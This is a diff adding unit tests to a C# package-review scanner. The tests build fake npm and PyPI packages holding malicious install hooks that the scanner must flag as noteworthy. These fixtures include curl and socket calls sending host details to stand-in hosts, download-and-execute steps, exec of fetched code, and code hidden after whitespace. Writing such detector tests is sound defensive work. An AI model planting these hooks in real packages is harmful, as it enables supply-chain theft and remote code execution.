@@ -122,6 +122,50 @@ public sealed class PackageReviewTests : IDisposable
     }
 
     [Fact]
+    public void An_install_command_that_runs_curl_by_its_full_path_is_noteworthy()
+    {
+        var r = Review(Tgz("notify-1.0.0.tgz", ("package/package.json", """{"name":"notify","version":"1.0.0","scripts":{"preinstall":"/usr/bin/curl --data-urlencode \"info=$(hostname && whoami)\" example.invalid"}}""")));
+        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "install script" } && f.Detail.Contains("network tool", StringComparison.Ordinal));
+    }
+
+    [Fact]
+    public void A_postinstall_that_starts_a_detached_script_is_read_with_that_script()
+    {
+        var r = Review(Tgz("iotdb-1.0.0.tgz",
+            ("package/package.json", """{"name":"iotdb","version":"1.0.0","scripts":{"postinstall":"node src/postinstall.js"}}"""),
+            ("package/src/postinstall.js", "const { spawn } = require('child_process');\nconst path = require('path');\nspawn('node', [path.join(__dirname, 'main.js')], { detached: true, stdio: 'ignore' }).unref();"),
+            ("package/src/main.js", "const os = require('os'), net = require('net');\nconst s = new net.Socket();\ns.connect(443, 'collector.example.invalid', () => s.write(os.hostname()));")));
+        Assert.Equal("noteworthy", r.Review);
+        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "install script", Path: "package/src/postinstall.js" } && f.Detail.Contains("host details", StringComparison.Ordinal));
+    }
+
+    [Fact]
+    public void An_install_eval_that_requires_a_downloader_and_a_collector_host_are_noteworthy()
+    {
+        var r = Review(Tgz("dt-tools-99.0.0.tgz",
+            ("package/package.json", """{"name":"dt-tools","version":"99.0.0","scripts":{"preinstall":"node -e \"try{require('./install.js')}catch(e){}\""}}"""),
+            ("package/install.js", "const https = require('https'), dns = require('dns'), { exec } = require('child_process');\ndns.lookup('ran.abc.oast.fun', () => {});\nhttps.get('https://example.invalid/tool', r => r.on('end', () => exec('/tmp/tool', { detached: true }).unref()));")));
+        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "exfiltration", Path: "package/install.js" });
+        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "install script" } && f.Detail.Contains("background process", StringComparison.Ordinal));
+    }
+
+    [Fact]
+    public void Code_after_hundreds_of_spaces_on_a_line_is_noteworthy()
+    {
+        var r = Review(Tgz("animate-4.0.2.tgz", ("package/package.json", """{"name":"animate","version":"4.0.2","main":"index.js"}"""),
+            ("package/index.js", "module.exports = {};" + new string('\t', 400) + "global['_V']='A4';")));
+        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "transformed code" } && f.Detail.Contains("spaces", StringComparison.Ordinal));
+    }
+
+    [Fact]
+    public void A_main_that_runs_code_from_a_response_is_noteworthy()
+    {
+        var r = Review(Tgz("string-utils-1.0.3.tgz", ("package/package.json", """{"name":"string-utils","version":"1.0.3","main":"index.js"}"""),
+            ("package/index.js", "fetch('https://status.example.invalid/check').then(r => r.json()).then(j => new Function('require', j.code)(require));")));
+        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "dynamic code" } && f.Detail.Contains("response", StringComparison.Ordinal));
+    }
+
+    [Fact]
     public void A_plain_package_has_nothing_to_review() =>
         Assert.Equal("none", Review(Tgz("left-pad-1.3.0.tgz", ("package/package.json", """{"name":"left-pad","version":"1.3.0","main":"index.js"}"""),
             ("package/index.js", "module.exports = (s, n, c) => String(s).padStart(n, c);"))).Review);
@@ -140,6 +184,27 @@ public sealed class PackageReviewTests : IDisposable
         Assert.Contains(r.Findings, f => f is { Category: "dynamic code", Level: "noteworthy" });
         Assert.Contains(r.Findings, f => f is { Category: "install script" } && f.Detail.Contains("cmdclass", StringComparison.Ordinal));
         Assert.Contains(r.Findings, f => f.Category == "name" && f.Detail.Contains("'requests'", StringComparison.Ordinal));
+    }
+
+    [Fact]
+    public void A_root_level_setup_py_that_runs_downloaded_code_and_a_bundled_program_is_noteworthy()
+    {
+        var r = Review(Zip("syntax-init-1.0.zip",
+            ("setup.py", U("from setuptools import setup\nimport subprocess\nfrom urllib.request import urlopen\nexec(urlopen('https://paste.example.invalid/raw').read())\nsubprocess.run(['tool.exe'], check=True)\nsetup(name='syntax-init', version='1.0')\n"))));
+        Assert.Equal("pypi sdist", r.Ecosystem);
+        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "dynamic code" } && f.Detail.Contains("downloads", StringComparison.Ordinal));
+        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "process" } && f.Detail.Contains("carries", StringComparison.Ordinal));
+    }
+
+    [Fact]
+    public void A_setup_py_that_puts_the_host_name_in_a_url_and_a_module_that_downloads_and_runs_a_program_are_noteworthy()
+    {
+        var r = Review(Tgz("keystack-99.0.tar.gz",
+            ("keystack-99.0/PKG-INFO", "Metadata-Version: 2.1\nName: keystack\nVersion: 99.0\n"),
+            ("keystack-99.0/setup.py", "import socket, subprocess\nfrom setuptools import setup\nh = socket.gethostname()\nurl = 'http://example.invalid/c/{h}'.format(h=h)\nsubprocess.run(['curl', '-s', url])\nsetup(name='keystack', version='99.0')\n"),
+            ("keystack-99.0/keystack/__init__.py", "import subprocess, urllib.request\nurllib.request.urlretrieve(_URL, _BIN)\nsubprocess.Popen([_BIN])\n")));
+        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "install script" } && f.Detail.Contains("host details", StringComparison.Ordinal));
+        Assert.Contains(r.Findings, f => f is { Level: "noteworthy", Category: "process", Path: "keystack-99.0/keystack/__init__.py" });
     }
 
     [Fact]
